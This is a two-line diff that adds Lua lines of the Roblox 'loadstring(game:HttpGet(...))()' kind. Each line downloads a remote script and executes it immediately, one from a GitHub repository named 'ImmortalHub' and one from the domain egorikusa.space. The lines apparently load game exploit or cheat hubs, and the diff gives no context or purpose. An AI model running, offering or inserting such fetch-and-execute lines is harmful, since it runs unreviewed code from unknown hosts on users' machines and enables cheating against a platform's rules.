@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/ImmortalHub/refs/heads/main/loader.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/d0ef3e925857047beb95b522.lua", true))()
